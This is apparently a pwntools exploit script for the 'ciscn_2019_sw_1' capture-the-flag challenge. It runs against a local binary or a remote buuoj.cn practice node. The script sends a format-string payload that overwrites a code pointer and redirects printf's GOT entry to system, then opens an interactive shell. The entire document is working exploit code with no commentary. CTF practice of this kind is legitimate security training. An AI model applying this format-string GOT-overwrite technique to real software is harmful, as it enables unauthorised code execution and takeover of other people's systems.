import sys
from pwn import *
context.log_level='debug'
context.arch='i386'

while True :
        # try :
        if len(sys.argv)==1 :
        	io=process('./ciscn_2019_sw_1')
        	# io=process(['./'],env={'LD_PRELOAD':'./'})
        	elf=ELF('./ciscn_2019_sw_1')
        	libc=ELF('/lib/i386-linux-gnu/libc.so.6')
        else :
        	io=remote('node3.buuoj.cn',29954)
        	elf=ELF('./ciscn_2019_sw_1')
        	libc=ELF('../../i386libc/libc.so.6')

        io.recv()
        pay=fmtstr_payload(4, {0x804979c: 0x08048534,elf.got['printf']:elf.plt['system']},write_size='short')
        #gdb.attach(io)
        io.sendline(pay)

        #io.send('cat flag\n')

        #pause()
        io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue